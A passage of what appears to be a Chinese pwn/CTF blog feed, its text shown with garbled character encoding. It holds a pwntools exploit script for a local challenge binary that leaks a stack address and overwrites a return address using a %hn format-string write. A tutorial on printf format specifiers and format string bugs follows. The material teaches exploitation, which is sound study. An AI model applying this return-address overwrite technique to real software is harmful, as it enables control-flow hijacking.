8ã€‚</p><p>åŒæ—¶æ ˆä¸Šï¼Œç¬¬ä¸€ä¸ªå…ƒç´ å­˜å‚¨çš„æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°çš„ rbp ä¹Ÿå°±æ˜¯æ¥ä¸‹æ¥æ‰€è¯´çš„æ—§è¿”å›åœ°å€ã€‚æ ˆä¸Šç¬¬äºŒä¸ªä½ç½®å­˜å‚¨çš„å°±æ˜¯å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ï¼Œåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„åç§»ä¸º 7ï¼Œç›¸å¯¹äºæ—§è¿”å›åœ°å€çš„åç§»ä¸º 0x7fffffffdd70 - 0x7fffffffdd38 &#x3D; 0x38ã€‚</p><p>è¿”å›åœ°å€ <code>0x400d74</code> å’Œç›®æ ‡åœ°å€ <code>0x4008AA</code>åªæœ‰ä½å­—èŠ‚ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥åªä¿®æ”¹ä½2å­—èŠ‚ ï¼Œå³ï¼šå†™æˆ <code>0x08AA = 2218</code>ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.arch=<span class="hljs-string">&quot;amd64&quot;</span><br><br>sh=process(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;modifier&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%6$p&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>ret_addr = <span class="hljs-built_in">int</span>(sh.recvline().strip(),<span class="hljs-number">16</span>) - <span class="hljs-number">0x38</span><br><br>sh.recv()<br>sh.writeline(<span class="hljs-string">&quot;2&quot;</span>)<br>sh.recv()<br>sh.sendline(p64(ret_addr))<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%2218d%8$hn&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p><strong>å¥‡æ€ªè¸©å‘ä¹‹æˆ‘æŠŠchatGPTç©å´©äº†</strong></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/Snipaste_2023-07-11_22-10-00.png"></p><p>é—®é¢˜å‘ç”Ÿåœ¨æˆ‘é—®äº† chatGPT ä¸€ä¸ªå¼±æ™ºé—®é¢˜åï¼Œå®ƒè¯´æˆ‘è¾“å…¥äº†å¯ç–‘ä¿¡æ¯ã€‚ğŸ˜¨</p><p>æœ€åæˆ‘å»æ‰¾äº†æœºå™¨äººå®¢æœç”³è¯‰ï¼Œä»Šå¤©æŠŠæˆ‘ä»å°é»‘å±‹æ”¾å‡ºæ¥äº†ã€‚</p><p>æˆ‘åšé”™äº†ä»€ä¹ˆæˆ‘å°±æ˜¯ç¬¨ç¬¨è€Œå·²ä¸ºä»€ä¹ˆæŠŠæˆ‘å…³å°é»‘å±‹ğŸ˜¿</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²</title>
    <link href="/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p>ä¼ è¯´ä¸­çš„Format String æ³„éœ²ä»»æ„åœ°å€å’Œè¦†ç›–ä»»æ„åœ°å€</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å°±æ˜¯å°†è®¡ç®—æœºå†…å­˜ä¸­è¡¨ç¤ºçš„æ•°æ®è½¬åŒ–ä¸ºæˆ‘ä»¬äººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†å…¶ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ã€‚åƒæ˜¯ <code>printf(&#39;My name is %s&#39;,&#39;Modifier&#39;)</code> ï¼Œ<code>printf()</code> å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ã€‚</p><h4 id="å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"><a href="#å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"></a>å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</h4><h5 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><ul><li>scanf</li></ul><h5 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><ul><li>printf    è¾“å‡ºåˆ°stdout</li><li>fprintf    è¾“å‡ºåˆ°FILEæµ</li><li>vprntf    æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°stdout</li><li>vfprintf    æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°æŒ‡å®š FILE æµ</li><li>sprintf    è¾“å‡ºåˆ°å­—ç¬¦ä¸²</li><li>snprintf   è¾“å‡ºæŒ‡å®šå­—èŠ‚æ•°åˆ°å­—ç¬¦ä¸²</li><li>vsprintf    æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°å­—ç¬¦ä¸²</li><li>vsnprintf    æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºæŒ‡å®šå­—èŠ‚åˆ°å­—ç¬¦ä¸²</li><li>setproctitle    è®¾ç½® argv</li><li>syslog    è¾“å‡ºæ—¥å¿—</li></ul><h4 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><ul><li><strong>Parameter</strong> - å¯çœç•¥</li></ul><p>è¡¨ç¤ºä¸º<code>n$</code>ï¼Œè¿™ä¸ªæ ¼å¼è¯´æ˜ç¬¦ç”¨äºè¯´æ˜æ˜¾ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚è¿™ä½¿å¾—åŒä¸€ä¸ªå‚æ•°å¯ä»¥ä»¥ä¸åŒçš„é¡ºåºè¢«è¾“å‡ºå¤šæ¬¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä»»æ„ä¸€ä¸ªå ä½ç¬¦ä½¿ç”¨äº†parameterï¼Œé‚£ä¹ˆæ‰€æœ‰çš„å ä½ç¬¦éƒ½å¿…é¡»ä½¿ç”¨parameterã€‚</p><p>egï¼š<code>printf(&quot;%2$d ,%1$d&quot;,16,17)</code> è¾“å‡ºç»“æœä¸º<code>17ï¼Œ16</code></p><ul><li><strong>Flags</strong> - å¯ä»¥ä¸º0æˆ–è€…å¤šä¸ª</li></ul><table><thead><tr><th>å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>+</td><td>ä»…ç”¨äºæ•°å€¼ç±»å‹ã€‚ç”¨äºè¡¨ç¤ºæœ‰ç¬¦å·æ•°å€¼çš„ <code>+</code> æˆ– <code>-</code> å·ï¼Œç¼ºçœæƒ…å†µæ—¶çœç•¥æ­£æ•°çš„ç¬¦å·ã€‚</td></tr><tr><td>ç©ºæ ¼</td><td>ä½œç”¨äºæœ‰ç¬¦å·æ•°çš„è¾“å‡ºï¼Œå¦‚æœæ²¡æœ‰æ­£è´Ÿå·æˆ–è€…è¾“å‡º0ä¸ªå­—ç¬¦ï¼Œåˆ™å‰ç¼€1ä¸ªç©ºæ ¼ã€‚å¦‚æœç©ºæ ¼ä¸â€™+â€™åŒæ—¶å‡ºç°ï¼Œåˆ™ç©ºæ ¼è¯´æ˜ç¬¦è¢«å¿½ç•¥ã€‚</td></tr><tr><td>-</td><td>å·¦å¯¹é½ã€‚ç¼ºçœæƒ…å†µæ˜¯å³å¯¹é½ã€‚</td></tr><tr><td>#</td><td>å¯¹äº <code>g</code> ä¸ <code>G</code> ï¼Œä¸åˆ é™¤å°¾éƒ¨0ä»¥è¡¨ç¤ºç²¾åº¦ã€‚å¯¹äº <code>f</code> , <code> F</code> ,  <code>e</code> ,  <code>E</code> ,  <code>g</code> ,  <code>G</code> , æ€»æ˜¯è¾“å‡ºå°æ•°ç‚¹ã€‚å¯¹äº <code>o</code> ,  <code>x</code> ,  <code>X</code> , åœ¨é0æ•°å€¼å‰åˆ†åˆ«è¾“å‡ºå‰ç¼€<code>0</code>, <code>0x</code>, and <code>0X</code>è¡¨ç¤ºæ•°åˆ¶ã€‚</td></tr><tr><td>0</td><td>å¦‚æœ width é€‰é¡¹å‰ç¼€ä»¥0ï¼Œåˆ™åœ¨å·¦ä¾§ç”¨0å¡«å……ç›´è‡³è¾¾åˆ°å®½åº¦è¦æ±‚ã€‚ä¾‹å¦‚<code>printf(&quot;%2d&quot;, 3)</code>è¾“å‡º <code> 3</code>ï¼Œè€Œ<code>printf(&quot;%02d&quot;, 3)</code>è¾“å‡º <code>03</code> ã€‚å¦‚æœ<code>0</code>ä¸<code>-</code>å‡å‡ºç°ï¼Œåˆ™<code>0</code>è¢«å¿½ç•¥ï¼Œå³å·¦å¯¹é½ä¾ç„¶ç”¨ç©ºæ ¼å¡«å……ã€‚</td></tr></tbody></table><ul><li><strong>Field width</strong></li></ul><p>field width å³åŸŸå®½ï¼Œç”¨äºè¡¨ç¤ºè¾“å‡ºå­—ç¬¦çš„æœ€å°å®½åº¦ï¼Œå¸¸ç”¨äºåˆ¶è¡¨è¾“å‡ºæ—¶å¡«å……å›ºå®šå®½åº¦çš„è¡¨ç›®ã€‚</p><p>å¦‚æœå®é™…è¾“å‡ºå†…å®¹å®½åº¦å°äºfield widthï¼Œåˆ™é»˜è®¤æŒ‰ç…§å·¦å¯¹é½çš„æ ‡å‡†è¿›è¡Œå¡«å……ï¼›å½“å®é™…è¾“å‡ºå†…å®¹å®½åº¦å¤§äºfield widthï¼Œä¸ä¼šæˆªæ–­è€Œæ˜¯åŸæ ·è¾“å‡ºã€‚</p><p>å¦‚æœåŸŸå®½å€¼ä¸º<code>*</code>ï¼Œä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ é€’æ—¶åˆ™ç”±å¯¹åº”çš„å‡½æ•°å‚æ•°çš„å€¼ä¸ºå½“å‰åŸŸå®½ï¼Œä¾‹å¦‚ <code>printf(&quot;%*d&quot;,5,10)</code> ï¼Œå‚æ•°<code>5</code>å°†ä¼ é€’ç»™<code>*</code>ä½œä¸ºè¿™ä¸ªè¾“å‡ºçš„åŸŸå®½ã€‚</p><p>éœ€è¦æ³¨æ„ï¼ŒåŸŸå®½æ²¡æœ‰è´Ÿå€¼ä¸”ä¸èƒ½è®¾ç½®ä¸º0ï¼šå‰å¯¼çš„è´Ÿå€¼è¢«è§£é‡Šä¸ºä¸€ä¸ªæ­£æ•°å‰å¯¼å€¼å’Œå·¦å¯¹é½æ ‡å¿—è´Ÿå·ï¼›å‰å¯¼0è¢«è§£é‡Šä¸º<code>flag</code>çš„0å¡«å……æ ‡å¿—ã€‚</p><ul><li><strong>.Precision</strong></li></ul><p>Precision æ˜¯ç²¾åº¦ï¼Œåœ¨æ„é€ å‡½æ•°æ—¶ä¸èƒ½å¿˜è®°å‰ç¼€ <code>.</code> ã€‚precision é€šå¸¸æŒ‡è¾“å‡ºçš„æœ€å¤§é•¿åº¦ï¼Œå…¶ä¸åŒçš„å«ä¹‰ä¾èµ–äºå…·ä½“çš„ä¸åŒçš„æ ¼å¼åŒ–ç±»å‹ï¼š</p><p>å¯¹äº <code>d</code>ã€<code>i</code>ã€<code>u</code>ã€<code>x</code>ã€<code>o</code> çš„æ•´å‹æ•°å€¼æ˜¯æŒ‡æœ€å°çš„æ•°å­—ä½æ•°ï¼Œä¸è¶³çš„ä½è¦åœ¨å·¦ä¾§è¡¥0ï¼Œå¦‚æœè¶…è¿‡ä¹Ÿä¸æˆªæ–­ï¼Œç¼ºçœå€¼ä¸º1ã€‚</p><p>å¯¹äº <code>a/A</code>ã€<code>e/E</code>ã€<code>f/F</code> çš„æµ®ç‚¹å‹æ•°å€¼ï¼Œæ˜¯æŒ‡å°æ•°ç‚¹åæ˜¾ç¤ºçš„ä½æ•°ï¼Œå¿…è¦æ—¶å››èˆäº”å…¥æˆ–è¡¥0ï¼Œç¼ºçœå€¼ä¸º6ã€‚</p><p>å¯¹äº <code>s</code> çš„å­—ç¬¦ä¸²ç±»å‹ï¼Œæ˜¯æŒ‡è¾“å‡ºçš„å­—èŠ‚çš„ä¸Šé™ï¼Œè¶…å‡ºé™åˆ¶çš„å…¶å®ƒå­—ç¬¦å°†è¢«æˆªæ–­ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè®¾ç½®ä¸º<code>*</code>ï¼Œåˆ™ç”±å¯¹åº”çš„å‡½æ•°å‚æ•°çš„å€¼ä¸ºå½“å‰ç²¾åº¦å€¼ã€‚ä¾‹å¦‚ <code>printf(&quot;%.*s&quot;,3,&quot;abcde&quot;)</code> çš„è¾“å‡ºä¸º <code>abc</code> ã€‚</p><ul><li><strong>Length</strong> - å¯çœç•¥</li></ul><p>length æŒ‡è¾“å‡ºçš„æµ®ç‚¹å‹æˆ–è€…æ•´å‹å‚æ•°çš„é•¿åº¦ï¼Œä¹Ÿè¢«ç§°ä¸ºsizeã€‚</p><table><thead><tr><th>å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>hh</td><td>è¡¨ç¤ºå‡½æ•°æœŸæœ›æ¥æ”¶ä¸€ä¸ª char ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šå°†å®ƒæå‡ä¸º int ç±»å‹ã€‚</td></tr><tr><td>h</td><td>è¡¨ç¤ºå‡½æ•°æœŸæœ›æ¥æ”¶ä¸€ä¸ª short ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šå°†å®ƒæå‡ä¸º int ç±»å‹ã€‚</td></tr><tr><td>ll</td><td>è¡¨ç¤ºå‡½æ•°æ¥æ”¶ä¸€ä¸ª long long ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šæŠŠå®ƒè½¬æ¢ä¸º int ç±»å‹ã€‚</td></tr><tr><td>l</td><td>è¡¨ç¤ºå‡½æ•°æ¥æ”¶ä¸€ä¸ª long ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šæŠŠå®ƒè½¬æ¢ä¸º int ç±»å‹ã€‚</td></tr><tr><td>L</td><td>è¡¨ç¤ºå‡½æ•°æ¥æ”¶ä¸€ä¸ª long double ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šæŠŠå®ƒè½¬æ¢ä¸º double ç±»å‹ã€‚</td></tr><tr><td>j</td><td>è¡¨ç¤ºå‡½æ•°æ¥æ”¶ä¸€ä¸ª intmax_t (å¸¦ç¬¦å·çš„æœ€å¤§å®½åº¦æ•´å‹ï¼Œå…¶èŒƒå›´åœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šå¯èƒ½æœ‰æ‰€å˜åŒ–) ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šæŠŠå®ƒè½¬æ¢ä¸º int ç±»å‹ã€‚</td></tr><tr><td>t</td><td>è¡¨ç¤ºå‡½æ•°æ¥æ”¶ä¸€ä¸ª ptrdiff_t () ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šæŠŠå®ƒè½¬æ¢ä¸º int ç±»å‹ã€‚</td></tr><tr><td>z</td><td>è¡¨ç¤ºå‡½æ•°æ¥æ”¶ä¸€ä¸ª size_t ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¼šæŠŠå®ƒè½¬æ¢ä¸º int ç±»å‹ã€‚</td></tr></tbody></table><ul><li><strong>type</strong></li></ul><p>typeå°±æ˜¯ç±»å‹è½¬æ¢ç¬¦ï¼Œå¯ä»¥å…·ä½“å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å­—ç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>d&#x2F;i</td><td><code>signed int</code> ã€‚åœ¨è¾“å‡ºæ—¶ï¼Œ<code>d</code> å’Œ <code>i</code> åŒä¹‰ï¼Œä½†åœ¨è¾“å…¥æ—¶æœ‰æ‰€ä¸åŒã€‚ <code>%i</code> åœ¨è¾“å…¥å€¼æœ‰å‰ç¼€ <code>0x</code> æ—¶ï¼Œå°†æ•°æ®è½¬æ¢ä¸º16è¿›åˆ¶ï¼›åœ¨æœ‰å‰ç¼€ <code>0</code> æ—¶ï¼Œå°†æ•°æ®è½¬æ¢ä¸º8è¿›åˆ¶ã€‚</td></tr><tr><td>u</td><td>åè¿›åˆ¶ <code>unsigned int</code>ã€‚</td></tr><tr><td>f&#x2F;F</td><td>å›ºå®šå°æ•°ç‚¹è¡¨ç¤ºæ³•è¡¨ç¤ºçš„<code>double</code>ï¼Œå°æ•°ç‚¹åçš„ä½æ•°ç”±ç²¾åº¦å­—æ®µæ§åˆ¶ã€‚<code>f </code>å’Œ <code>F</code> åœ¨è¾“å‡ºæ— é™å¤§å’ŒNANæ—¶æ‰“å°å‡ºçš„å­—ç¬¦ä¸²ä¸åŒï¼Œ<code>f</code> ä¸º <code>inf</code> ã€ <code>infinity</code> å’Œ <code>nan</code> ï¼Œ <code>F</code> ä¸º <code>INF</code> ã€ <code>INFINITY</code> å’Œ <code>NAN</code> ã€‚</td></tr><tr><td>e&#x2F;E</td><td>ä»¥ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„<code>double</code>ï¼ŒæŒ‡æ•°éƒ¨åˆ†ä½¿ç”¨å°å†™å­—æ¯ <code>e</code> æˆ– <code>E</code> å¼•å…¥ã€‚æŒ‡æ•°è‡³å°‘åŒ…å«ä¸¤ä¸ªæ•°å­—ï¼Œå¦‚æœå€¼ä¸ºé›¶ï¼Œåˆ™æŒ‡æ•°ä¸º00ã€‚ä¾‹å¦‚ï¼Œ<code>1.2345e+03</code>è¡¨ç¤º1.2345ä¹˜10çš„3æ¬¡æ–¹ã€‚</td></tr><tr><td>g&#x2F;G</td><td>æŒ‰ç…§å…·ä½“æƒ…å†µåœ¨å›ºå®šå°æ•°ç‚¹è¡¨ç¤ºæ³•å’Œç§‘å­¦è®¡æ•°æ³•ä¹‹é—´é€‰æ‹©åˆé€‚çš„doubleã€‚</td></tr><tr><td>x&#x2F;X</td><td>ä»¥åå…­è¿›åˆ¶æ•°å½¢å¼è¾“å‡ºçš„ <code>signed int</code> ã€‚xä½¿ç”¨å°å†™å­—æ¯ï¼ŒXä½¿ç”¨å¤§å†™å­—æ¯ã€‚</td></tr><tr><td>o</td><td>ä»¥å…«è¿›åˆ¶å½¢å¼è¾“å‡ºçš„ <code>signed int </code>ã€‚</td></tr><tr><td>s</td><td>ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>c</td><td>charï¼ˆå­—ç¬¦ï¼‰ã€‚</td></tr><tr><td>p</td><td>void*ï¼ˆæŒ‡å‘voidçš„æŒ‡é’ˆï¼‰ä»¥ç‰¹å®šäºå®ç°çš„æ ¼å¼è¾“å‡ºã€‚<code>printf(&quot;%p&quot;,a)</code> ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œ<code>printf(&quot;%p&quot;, &amp;a)</code> æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚</td></tr><tr><td>a&#x2F;A</td><td>ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºæ³•è¾“å‡ºçš„<code>double</code>ï¼Œä»¥0xæˆ–0Xå¼€å¤´ã€‚aä½¿ç”¨å°å†™å­—æ¯ï¼ŒAä½¿ç”¨å¤§å†™å­—æ¯ã€‚</td></tr><tr><td>n</td><td>ä¸è¾“å‡ºä»»ä½•å†…å®¹ï¼Œä½†å°†åˆ°ç›®å‰ä¸ºæ­¢å·²å†™å…¥çš„å­—ç¬¦æ•°å†™å…¥æ•´æ•°æŒ‡é’ˆå‚æ•°ã€‚</td></tr></tbody></table><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†</h3><p>æˆ‘ä»¬çŸ¥é“ï¼Œx86æ˜¯é€šè¿‡æ ˆæ¥ä¼ é€’å‡½æ•°çš„å‚æ•°çš„ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s&quot;</span>,<span class="hljs-string">&quot;hello Modifier\n&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å…¶æ‰§è¡Œprintfæ—¶çš„æ ˆç»“æ„å¦‚ä¸‹ï¼ˆè¿™é‡Œç¼–è¯‘æˆ64ä½çš„äº†ï¼Œæ‰€ä»¥åœ¨gdbä¸ä¼šåœ¨æ ˆä¸­æ˜¾ç¤ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æœ¬èº«ï¼‰</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/printf-stack.png"></p><p>å®é™…æ ˆä¸­çš„ç»“æ„ä»é«˜åˆ°ä½ä¾æ¬¡æ˜¯<code>&#39;\n&#39;æŒ‡é’ˆ --&gt; 0xcafebabe --&gt; &#39;hello Modifier\n&#39;æŒ‡é’ˆ--&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒ‡é’ˆ</code></p><p>çœ‹ä¸Šå»ä¸€åˆ‡æ­£å¸¸ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å‘¢ï¼Ÿ</p><p>æ ¹æ® cdecl çš„è°ƒç”¨çº¦å®šï¼Œåœ¨è¿›å…¥ <code>printf ()</code> å‡½æ•°ä¹‹å‰ï¼Œå°†å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆã€‚è¿›å…¥ <code>printf ()</code> ä¹‹åï¼Œå‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚</p><ul><li>å¦‚æœå­—ç¬¦ä¸æ˜¯ %ï¼Œå­—ç¬¦ç›´æ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ã€‚</li><li>å­—ç¬¦æ˜¯%ï¼Œè¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸ºç©ºåˆ™æŠ¥é”™ï¼Œå¦‚æœå­—ç¬¦ä¸º%ï¼Œè¾“å‡º%ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æè¾“å‡ºã€‚</li></ul><p>æ€»è€Œè¨€ä¹‹ï¼Œå…¶å®æ ¼å¼å­—ç¬¦ä¸²æ¼æ´å‘ç”Ÿçš„æ¡ä»¶å°±æ˜¯<strong>æ ¼å¼å­—ç¬¦ä¸²è¦æ±‚çš„å‚æ•°å’Œå®é™…æä¾›çš„å‚æ•°ä¸åŒ¹é…</strong>ã€‚</p><p>å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s %x %x %x&quot;</span>,<span class="hljs-string">&quot;hello Modifier&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå°±ä¼šè¾“å‡ºæ ˆä¸Šçš„é«˜åœ°å€</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-1.png"></p><p>åŒæ ·ï¼Œå¦‚æœæˆ‘ä»¬æŠŠå‡½æ•°å†™æˆè¿™ä¸ªæ ·å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨‹åºç…§æ ·ä¼šè¿è¡Œï¼Œä½†è¾“å‡ºå¦‚ä¸‹å›¾</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-2.png"></p><p>å…¶ä¸­ç¬¬ä¸€ä¸ª%sï¼Œç¨‹åºå°†å…¶è§£æä¸ºå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæˆ‘ä»¬æä¾›ä¸€ä¸ªä¸å­˜åœ¨çš„åœ°å€ï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>å°±åƒåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸç†éƒ¨åˆ†è¯´çš„ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸¤ä¸ªåˆ©ç”¨æ‰‹æ®µå°±æ˜¯;</p><ul><li>åˆ©ç”¨%s å¯¹åº”çš„å‚æ•°åœ°å€ä¸åˆæ³•è®©ç¨‹åºå´©æºƒã€‚</li><li>æ ¹æ® %dï¼Œ%f 